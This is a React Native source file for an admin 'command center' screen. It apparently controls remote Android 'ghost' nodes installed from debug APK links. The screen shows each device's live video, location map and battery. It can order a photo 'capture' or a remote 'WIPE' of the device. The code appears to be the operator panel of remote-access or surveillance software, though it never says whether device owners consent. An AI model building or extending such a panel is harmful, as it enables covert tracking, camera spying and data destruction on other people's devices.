import React, { useState, useEffect } from 'react';
import { View, ScrollView, StyleSheet, Text, Vibration, SafeAreaView, StatusBar, TouchableOpacity, Linking } from 'react-native';
import socket from '../services/socket';

// Import Child Components
import StatusCard from '../components/StatusCard';
import VideoFeed from '../components/VideoFeed';
import LogConsole from '../components/LogConsole';
import TacticalMap from '../components/TacticalMap';

const AdminScreen = () => {
  const [ghosts, setGhosts] = useState({});
  const [logs, setLogs] = useState([]);

  useEffect(() => {
    socket.on('heartbeat_update', (data) => {
      setGhosts(prev => ({ 
        ...prev, 
        [data.name]: { ...prev[data.name], ...data, lastSeen: Date.now() } 
      }));
    });

    socket.on('log_update', (newLog) => {
      const logWithTime = {
        ...newLog,
        timestamp: newLog.timestamp || new Date().toLocaleTimeString()
      };
      setLogs(prev => [...prev, logWithTime].slice(-50));
      if (newLog.type === 'ERROR') Vibration.vibrate([0, 150, 100, 150]); 
    });

    socket.on('ghost_activity', (payload) => {
      if (payload.type === 'SNAPSHOT') {
        setLogs(prev => [...prev, { 
          type: 'SYSTEM', 
          message: `SNAPSHOT RECEIVED FROM ${payload.name}`, 
          timestamp: new Date().toLocaleTimeString() 
        }]);
      }
    });

    return () => {
      socket.off('heartbeat_update');
      socket.off('log_update');
      socket.off('ghost_activity');
    };
  }, []);

  const sendCommand = (target, cmd) => {
    socket.emit('admin_command', { targetId: target, cmd });
    Vibration.vibrate(50);
  };

  return (
    <SafeAreaView style={styles.container}>
      <StatusBar barStyle="light-content" />
      
      <View style={styles.header}>
        <Text style={styles.headerTitle}>JOYJET HUB / COMMAND CENTER</Text>
        <View style={styles.onlineIndicator}>
          <View style={styles.greenDot} />
          <Text style={styles.onlineCount}>{Object.keys(ghosts).length} NODES OPERATIONAL</Text>
        </View>
        <View style={styles.headerLinks}>
          <TouchableOpacity onPress={() => Linking.openURL('https://github.com/guru9/joyjet-hub/releases/download/latest/app-debug.apk')}>
            <Text style={styles.headerLinkTxt}>[NEW APK]</Text>
          </TouchableOpacity>
          <TouchableOpacity onPress={() => Linking.openURL('https://github.com/guru9/joyjet-hub/releases/download/v4.1.0/app-debug.apk')}>
            <Text style={styles.headerLinkTxt}>[OLD APK]</Text>
          </TouchableOpacity>
        </View>
      </View>

      <ScrollView style={styles.nodeList}>
        {Object.values(ghosts).map((ghost) => (
          <View key={ghost.name} style={styles.ghostCard}>
            <View style={styles.cardHeader}>
              <Text style={styles.nodeId}>GHOST :: {ghost.name.toUpperCase()}</Text>
              <Text style={styles.vitals}>{ghost.battery}</Text>
            </View>

            <VideoFeed ghostName={ghost.name} />
            <TacticalMap location={ghost.location} ghostName={ghost.name} />

            <View style={styles.controls}>
              <TouchableOpacity style={styles.btn} onPress={() => sendCommand(ghost.name, 'SNAPSHOT')}>
                <Text style={styles.btnTxt}>CAPTURE</Text>
              </TouchableOpacity>
              <TouchableOpacity style={[styles.btn, styles.danger]} onPress={() => sendCommand(ghost.name, 'WIPE')}>
                <Text style={styles.btnTxt}>WIPE</Text>
              </TouchableOpacity>
            </View>
          </View>
        ))}
      </ScrollView>

      <LogConsole logs={logs} />
    </SafeAreaView>
  );
};

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000' },
  header: { paddingVertical: 15, alignItems: 'center', backgroundColor: '#050505', borderBottomWidth: 1, borderBottomColor: '#111' },
  headerTitle: { color: '#fff', fontSize: 10, letterSpacing: 5 },
  onlineIndicator: { flexDirection: 'row', alignItems: 'center', marginTop: 5 },
  greenDot: { width: 4, height: 4, borderRadius: 2, backgroundColor: '#00ff00', marginRight: 5 },
  onlineCount: { color: '#00ff00', fontSize: 8, fontWeight: 'bold' },
  headerLinks: { flexDirection: 'row', gap: 10, marginTop: 8 },
  headerLinkTxt: { color: '#444', fontSize: 7, fontWeight: 'bold' },
  nodeList: { flex: 1, padding: 10 },
  ghostCard: { backgroundColor: '#080808', borderRadius: 8, padding: 12, marginBottom: 15, borderWidth: 1, borderColor: '#111' },
  cardHeader: { flexDirection: 'row', justifyContent: 'space-between', marginBottom: 8 },
  nodeId: { color: '#444', fontSize: 9, fontWeight: 'bold' },
  vitals: { color: '#00ff00', fontSize: 9 },
  controls: { flexDirection: 'row', gap: 10, marginTop: 12 },
  btn: { flex: 1, height: 35, borderWidth: 1, borderColor: '#222', justifyContent: 'center', alignItems: 'center', borderRadius: 4 },
  danger: { borderColor: '#ff4444' },
  btnTxt: { color: '#fff', fontSize: 9, fontWeight: 'bold', letterSpacing: 1 }
});

export default AdminScreen;
